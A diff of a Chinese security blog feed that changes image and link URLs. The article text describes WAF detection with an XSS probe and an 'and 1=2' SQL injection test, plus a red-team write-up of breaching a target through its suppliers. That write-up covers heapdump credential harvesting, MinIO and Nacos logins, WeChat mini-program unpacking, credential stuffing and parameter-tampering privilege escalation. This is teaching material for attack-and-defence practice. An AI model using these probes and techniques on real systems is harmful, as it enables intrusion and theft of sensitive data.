     <a href="#61%e5%9c%a8%e7%ba%bf%e8%b5%84%e4%ba%a7%e8%af%86%e5%88%ab" class="header-mark"></a>6.1、在线资产识别</h3><p>云悉WEB资产梳理</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-bdbbbee08710a8f6d3d67b0a0ca820e3d6bdcf55.png" title="image-20240318224859531" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-bdbbbee08710a8f6d3d67b0a0ca820e3d6bdcf55.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-bdbbbee08710a8f6d3d67b0a0ca820e3d6bdcf55.png" title="image-20240318224859531" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-bdbbbee08710a8f6d3d67b0a0ca820e3d6bdcf55.png">
         
     </a></p>
 <h3 id="62手动检测是拦截页面或者http可识别字段" class="headerLink">
     <a href="#62%e6%89%8b%e5%8a%a8%e6%a3%80%e6%b5%8b%e6%98%af%e6%8b%a6%e6%88%aa%e9%a1%b5%e9%9d%a2%e6%88%96%e8%80%85http%e5%8f%af%e8%af%86%e5%88%ab%e5%ad%97%e6%ae%b5" class="header-mark"></a>6.2、手动检测是拦截页面或者HTTP可识别字段</h3><p>在搜索框中输入XSS弹窗代码<script>alert(&lsquo;XSS&rsquo;)</script> ，WAF拦截后判断WAF。</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-6f3ff949ae9133c2e3d419fefe8336d950b6e0f0.png" title="image-20240318224910129" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-6f3ff949ae9133c2e3d419fefe8336d950b6e0f0.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-6f3ff949ae9133c2e3d419fefe8336d950b6e0f0.png" title="image-20240318224910129" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/万字总结信息收集全网最全/attach-6f3ff949ae9133c2e3d419fefe8336d950b6e0f0.png">
         
     </a></p>
 <p>在可能存在的注入页面输入检测注入漏洞代码and 1=2，被WAF拦截后判断WAF。</p>
@@ -1271,10 +1271,10 @@
 <p>·12社工、XSS利用社会工程系获取后台，利用存储型XSs获取后台</p>]]></description>
 </item><item>
     <title>攻防实战外网突破</title>
-    <link>http://localhost:1313/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/</link>
+    <link>https://www.bysec.cn/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/</link>
     <pubDate>Sun, 11 Feb 2024 18:24:29 &#43;0800</pubDate><author>
         <name>bysec</name>
-    </author><guid>http://localhost:1313/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/</guid>
+    </author><guid>https://www.bysec.cn/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/</guid>
     <description><![CDATA[<blockquote>
 <p><em>转载自： <a href="https://forum.butian.net/share/2442" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2442</a></em></p>
 </blockquote>
@@ -1282,32 +1282,32 @@
 <h2 id="1供应链" class="headerLink">
     <a href="#1%e4%be%9b%e5%ba%94%e9%93%be" class="header-mark"></a>1、供应链</h2><p>在经历了多年的攻防对抗之后，大量目标单位逐渐认识到安全防护的重要性。因此，他们已采取措施尽可能收敛资产暴露面，并加倍部署各种安全设备。但安全防护注重全面性，具有明显的短板效应，一处出现短板，整个防护体系就可能瞬间崩溃。而目标单位的供应链往往是这些薄弱点的集中体现。这些供应链不仅暴露在外，而且由于复杂的关系，使得对它们的监控和管理变得更为困难。因此，攻击团队通常会选择从供应链着手，以一种迂回的方式绕过目标单位强大的防御体系，获得对目标单位的控制权限。</p>
 <p>通过在搜索引擎上搜索&quot;系统名称&quot;目标单位</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-dc15fb381ad5ad415f72b673e089f8a5a86ba421.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-dc15fb381ad5ad415f72b673e089f8a5a86ba421.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-dc15fb381ad5ad415f72b673e089f8a5a86ba421.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-dc15fb381ad5ad415f72b673e089f8a5a86ba421.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-dc15fb381ad5ad415f72b673e089f8a5a86ba421.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-dc15fb381ad5ad415f72b673e089f8a5a86ba421.png">
         
     </a><br>
 找到相关的供应商信息，通过对供应商进行攻击，获取目标单位的数据及权限。!</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-06c417df425049e840d6fc969931aea2c57abc86.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-06c417df425049e840d6fc969931aea2c57abc86.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-06c417df425049e840d6fc969931aea2c57abc86.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-06c417df425049e840d6fc969931aea2c57abc86.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-06c417df425049e840d6fc969931aea2c57abc86.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-06c417df425049e840d6fc969931aea2c57abc86.png">
         
     </a></p>
 <h2 id="11heapdump泄露" class="headerLink">
     <a href="#11heapdump%e6%b3%84%e9%9c%b2" class="header-mark"></a>1.1、heapdump泄露</h2><p>通过对供应商资产进行渗透，发现某资产admin目录下存在heapdump文件泄露</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-a8d29cdeabe3761026a599de6f67ed8c5ecf498e.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-a8d29cdeabe3761026a599de6f67ed8c5ecf498e.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-a8d29cdeabe3761026a599de6f67ed8c5ecf498e.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-a8d29cdeabe3761026a599de6f67ed8c5ecf498e.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-a8d29cdeabe3761026a599de6f67ed8c5ecf498e.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-a8d29cdeabe3761026a599de6f67ed8c5ecf498e.png">
         
     </a></p>
 <p>对于heapdump的利用方式这里就不太赘述，有许多文章对其原理和利用都进行了深入的研究，特定情况下还可以直接进行RCE，这里泄露了大量敏感信息，密码信息加入密码本</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-66928849da0ca5930c02525ce43efa892d6b634a.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-66928849da0ca5930c02525ce43efa892d6b634a.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-66928849da0ca5930c02525ce43efa892d6b634a.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-66928849da0ca5930c02525ce43efa892d6b634a.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-66928849da0ca5930c02525ce43efa892d6b634a.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-66928849da0ca5930c02525ce43efa892d6b634a.png">
         
     </a></p>
 <p>登录MinIO，发现大量所属目标单位的敏感信息，也存在其它单位的敏感信息</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-c1f383551c52acd3ee64b926f7d93fd9c137aef3.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-c1f383551c52acd3ee64b926f7d93fd9c137aef3.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-c1f383551c52acd3ee64b926f7d93fd9c137aef3.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-c1f383551c52acd3ee64b926f7d93fd9c137aef3.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-c1f383551c52acd3ee64b926f7d93fd9c137aef3.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-c1f383551c52acd3ee64b926f7d93fd9c137aef3.png">
         
     </a></p>
 <p>登录Nacos，大量配置文件，密码信息加入密码本![]</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-ac9cf0350376d0bdad40573ddba38eb4c5506cbd.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-ac9cf0350376d0bdad40573ddba38eb4c5506cbd.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-ac9cf0350376d0bdad40573ddba38eb4c5506cbd.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-ac9cf0350376d0bdad40573ddba38eb4c5506cbd.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-ac9cf0350376d0bdad40573ddba38eb4c5506cbd.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-ac9cf0350376d0bdad40573ddba38eb4c5506cbd.png">
         
     </a><br>
 登录OSS，发现大量所属目标单位的敏感信息</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-19969a44c514fa8ba5769db3cad69ee31c3e5997.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-19969a44c514fa8ba5769db3cad69ee31c3e5997.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-19969a44c514fa8ba5769db3cad69ee31c3e5997.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-19969a44c514fa8ba5769db3cad69ee31c3e5997.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-19969a44c514fa8ba5769db3cad69ee31c3e5997.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-19969a44c514fa8ba5769db3cad69ee31c3e5997.png">
         
     </a></p>
 <h2 id="12微信小程序接口未授权" class="headerLink">
@@ -1342,7 +1342,7 @@
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">C</span><span class="o">:</span><span class="nx">\Users\</span><span class="p">{</span><span class="nx">系统用户名</span><span class="p">}</span><span class="nx">\Documents\WeChat</span> <span class="nx">Files\Applet\</span><span class="p">{</span><span class="nx">小程序的AppID</span><span class="p">}</span><span class="nx">\</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-c07cd9ddd04c8648c9c91b6f299567c0b72b41ad.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-c07cd9ddd04c8648c9c91b6f299567c0b72b41ad.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-c07cd9ddd04c8648c9c91b6f299567c0b72b41ad.png">
+</div><p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-c07cd9ddd04c8648c9c91b6f299567c0b72b41ad.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-c07cd9ddd04c8648c9c91b6f299567c0b72b41ad.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-c07cd9ddd04c8648c9c91b6f299567c0b72b41ad.png">
         
     </a></p>
 <h4 id="1212解密操作" class="headerLink">
@@ -1350,11 +1350,11 @@
 <p><a href="https://github.com/superdashu/pc_wxapkg_decrypt_python" target="_blank" rel="noopener noreferrer">https://github.com/superdashu/pc_wxapkg_decrypt_python</a><br>
 <a href="https://github.com/BlackTrace/pc_wxapkg_decrypt" target="_blank" rel="noopener noreferrer">https://github.com/BlackTrace/pc_wxapkg_decrypt</a></p>
 <p>解密原理</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-d27d47fad9d778623595d826710881eb124d9568.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-d27d47fad9d778623595d826710881eb124d9568.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-d27d47fad9d778623595d826710881eb124d9568.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-d27d47fad9d778623595d826710881eb124d9568.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-d27d47fad9d778623595d826710881eb124d9568.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-d27d47fad9d778623595d826710881eb124d9568.png">
         
     </a><br>
 成功解密</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-cf8e0087265e9df8bccd324c23b00b2c999208a3.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-cf8e0087265e9df8bccd324c23b00b2c999208a3.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-cf8e0087265e9df8bccd324c23b00b2c999208a3.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-cf8e0087265e9df8bccd324c23b00b2c999208a3.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-cf8e0087265e9df8bccd324c23b00b2c999208a3.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-cf8e0087265e9df8bccd324c23b00b2c999208a3.png">
         
     </a></p>
 <h4 id="1212解包操作" class="headerLink">
@@ -1368,68 +1368,68 @@
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">node</span> <span class="nx">wuWxapkg</span><span class="o">.</span><span class="nx">js</span> <span class="mf">1.</span><span class="nx">wxapkg</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-34059d3982e40191688ff91a62ff887f20664ed1.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-34059d3982e40191688ff91a62ff887f20664ed1.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-34059d3982e40191688ff91a62ff887f20664ed1.png">
+</div><p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-34059d3982e40191688ff91a62ff887f20664ed1.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-34059d3982e40191688ff91a62ff887f20664ed1.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-34059d3982e40191688ff91a62ff887f20664ed1.png">
         
     </a></p>
 <p>对小程序进行解包操作，获取到前端JS代码后中，从中进行提取获得接口</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-9d445cec5aa86f847adfa0539ce14de6d811fcbc.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-9d445cec5aa86f847adfa0539ce14de6d811fcbc.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-9d445cec5aa86f847adfa0539ce14de6d811fcbc.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-9d445cec5aa86f847adfa0539ce14de6d811fcbc.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-9d445cec5aa86f847adfa0539ce14de6d811fcbc.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-9d445cec5aa86f847adfa0539ce14de6d811fcbc.png">
         
     </a></p>
 <p>直接访问目标接口，前端页面虽然显示初始化失败</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-15d32eb56abb7ade12e2457bf0e2831eff541cee.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-15d32eb56abb7ade12e2457bf0e2831eff541cee.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-15d32eb56abb7ade12e2457bf0e2831eff541cee.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-15d32eb56abb7ade12e2457bf0e2831eff541cee.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-15d32eb56abb7ade12e2457bf0e2831eff541cee.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-15d32eb56abb7ade12e2457bf0e2831eff541cee.png">
         
     </a><br>
 但流量包中已获取数据，近千万条目标单位敏感信息</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-54eca16fac67d0a5ee4681bb3fd48aa33c55adb5.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-54eca16fac67d0a5ee4681bb3fd48aa33c55adb5.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-54eca16fac67d0a5ee4681bb3fd48aa33c55adb5.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-54eca16fac67d0a5ee4681bb3fd48aa33c55adb5.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-54eca16fac67d0a5ee4681bb3fd48aa33c55adb5.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-54eca16fac67d0a5ee4681bb3fd48aa33c55adb5.png">
         
     </a></p>
 <h2 id="13web程序越权" class="headerLink">
     <a href="#13web%e7%a8%8b%e5%ba%8f%e8%b6%8a%e6%9d%83" class="header-mark"></a>1.3、web程序越权</h2><p>通过上述收集到的密码，撞密码撞出一个账号，但是此账号为最低权限，无任何操作权限，点击搜索组织架构，此时无任何返回信息<br>
-<a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-13aebe0c150b3a80913a78bea00857172d90edd8.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-13aebe0c150b3a80913a78bea00857172d90edd8.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-13aebe0c150b3a80913a78bea00857172d90edd8.png">
+<a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-13aebe0c150b3a80913a78bea00857172d90edd8.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-13aebe0c150b3a80913a78bea00857172d90edd8.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-13aebe0c150b3a80913a78bea00857172d90edd8.png">
         
     </a></p>
 <p>抓包将parentId和orgLevel去除，再发包，即可越权看到全员组织架构</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-eaaa24aec2cd0aaffcba0cb30c7867bba9e0f61d.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-eaaa24aec2cd0aaffcba0cb30c7867bba9e0f61d.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-eaaa24aec2cd0aaffcba0cb30c7867bba9e0f61d.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-eaaa24aec2cd0aaffcba0cb30c7867bba9e0f61d.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-eaaa24aec2cd0aaffcba0cb30c7867bba9e0f61d.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-eaaa24aec2cd0aaffcba0cb30c7867bba9e0f61d.png">
         
     </a></p>
 <p>点击修改密码，然后将上述获取到的roleId添加进去，即可获取全部权限</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-766adde7cecebb3b8aa309fd163c508dd0cc9197.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-766adde7cecebb3b8aa309fd163c508dd0cc9197.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-766adde7cecebb3b8aa309fd163c508dd0cc9197.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-766adde7cecebb3b8aa309fd163c508dd0cc9197.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-766adde7cecebb3b8aa309fd163c508dd0cc9197.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-766adde7cecebb3b8aa309fd163c508dd0cc9197.png">
         
     </a></p>
 <p>获取到大量数据</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-aaceb387674ff04511482b780b03369902094232.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-aaceb387674ff04511482b780b03369902094232.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-aaceb387674ff04511482b780b03369902094232.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-aaceb387674ff04511482b780b03369902094232.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-aaceb387674ff04511482b780b03369902094232.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-aaceb387674ff04511482b780b03369902094232.png">
         
     </a></p>
 <h2 id="14公众号" class="headerLink">
     <a href="#14%e5%85%ac%e4%bc%97%e5%8f%b7" class="header-mark"></a>1.4、公众号</h2><p>js泄露密码，密码可撞库目标单位公众号</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-ff3a1b05088baedcae2323da2f0c6634277c44c6.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-ff3a1b05088baedcae2323da2f0c6634277c44c6.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-ff3a1b05088baedcae2323da2f0c6634277c44c6.png">
